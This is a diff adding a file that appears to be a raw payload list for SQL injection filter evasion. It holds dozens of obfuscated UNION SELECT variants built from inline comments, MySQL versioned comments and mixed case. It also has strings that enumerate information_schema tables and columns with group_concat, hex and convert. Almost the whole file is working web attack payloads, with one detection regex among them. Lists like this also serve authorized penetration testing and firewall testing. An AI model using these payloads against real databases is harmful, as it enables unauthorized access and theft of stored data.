@@ -1,0 +1,70 @@
+Info
+/**/ORDER/**/BY/**/
+/*!ORDER BY*/
+/*!50000ORDER*//**//*!50000BY*/
+/**/UNION/**//*!50000SELECT*//**/
++union+distinct+select+
+/**//*!12345UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+union /*!50000Select*/
+"union (/*!/**/ SeleCT */ 1,2,3)"
+/*!uNIOn*/ /*!SelECt*/
+/*!50000UniON SeLeCt*/
+/*!UnIoN*/SeLecT
+/*--*/union/*--*/select/*--*/
+/*!union*/+/*!select*/
+/**/union/**/select/**/
+/**//*!12345UNION SELECT*//**/
+/*!uNIOn*/ /*!SelECt*/
++union+distinctROW+select+
+UNIunionON+SELselectECT
+/**//*!50000UNION SELECT*//**/
+union/**/select
+/**/UNION/*/SELECT/**/
+/*!union*//*--*//*!all*//*--*//*!select*/
+"concat(0x273e27,version(),0x3c212d2d)"
+"concat(0x223e3c62723e,version(),0x3c696d67207372633d22)"
+/*!union*/+/*!select*/
+UNION(SELECT(column)FROM(table))
+/**/UNION/**//*!50000SELECT*//**/
+"union (select 1111,2222,3333)"
+"union (select 1111,2222,3333)"
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
++#uNiOn+#sEleCt
+/*!50000UniON SeLeCt*/
+/**/uNIon/**/sEleCt/**/
+/union\s+select/i
++UnIoN/*&a=*/SeLeCT/*&a=*/
++(UnIoN)+(SelECT)+
++’UnI”On’+'SeL”ECT’
++/*!UnIoN*/+/*!SeLeCt*/+
+/**//*!union*//**//*!select*//**/
+/**/union/*!50000select*/
+/*union*/union/*select*/select+
++un/**/ion+sel/**/ect+
+UNION/*&test=1*/SELECT/*&pwn=2*/
++UNunionION+SEselectLECT+
+union+/*!select*/
+/*!union*/+/*!select*/
+/*!UnIoN*/SeLecT+
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
+/*!FrOm*/+information_schema./**/columns+/*!50000Where*/+/*!table_name*/=hex table
+CoNcAt()
+CONVERT(group_concat(table_name)+USING+latin1)
+"concat(0x223e,@@version)"
+/*!50000cOnCat*/(/*!*/)
+unhex(hex(/*!12345concat*/(table_name)))
+/*!group_concat*/()
+group_concat(/*!*/)
+group_concat(/*!50000table_name*/)
+/*!group_concat*/(/*!50000table_name*/)
+/*!50000group_concat*/(/*!50000table_name*/)
+/*!12345GroUP_ConCat*/()
+"concat(0x223e3c62723e,version(),0x3c696d67207372633d22)"
+unhex(hex(/*!group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(table_name)))
+unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
+unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
+convert(group_concat(table_name)+using+ascii)
+convert(group_concat(/*!12345table_name*/)+using+ascii)
